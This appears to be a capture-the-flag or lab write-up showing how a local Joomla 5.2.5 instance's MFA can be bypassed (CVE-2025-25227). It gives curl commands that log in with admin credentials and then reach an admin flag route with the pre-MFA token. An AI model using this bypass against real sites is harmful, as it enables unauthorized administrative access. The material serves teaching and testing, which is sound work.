# Finding the Bug

## Tracing the Login Flow

Enumerate available endpoints:

```bash
curl http://localhost:8080/
```

Output:
```json
{
  "cms": "Joomla! 5.2.5",
  "endpoints": [
    "POST /api/v1/login",
    "GET  /api/v1/mfa-challenge",
    "POST /api/v1/mfa-verify",
    "GET  /administrator/flag"
  ]
}
```

Log in with admin credentials:

```bash
curl -s -X POST http://localhost:8080/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"joom1aAdmin!"}'
```

Output:
```json
{
  "token": "a3f8...",
  "mfa_required": true,
  "next_step": "/api/v1/mfa-challenge"
}
```

The server says MFA is required and points to the challenge endpoint. The normal flow
would be to fetch the challenge, then POST the TOTP code to `/api/v1/mfa-verify`.

## Skipping the MFA Step

Try accessing the flag directly with the login token, without touching the MFA endpoints:

```bash
curl -s http://localhost:8080/administrator/flag \
  -H "Authorization: Bearer a3f8..."
```

Output:
```json
{
  "flag": "POC{...}",
  "note": "MFA step was skipped. CVE-2025-25227"
}
```

The flag is returned. The admin route checked `state == "logged_in"` (true) but never
verified `mfa_verified == True`. The MFA check was advisory, not enforced.
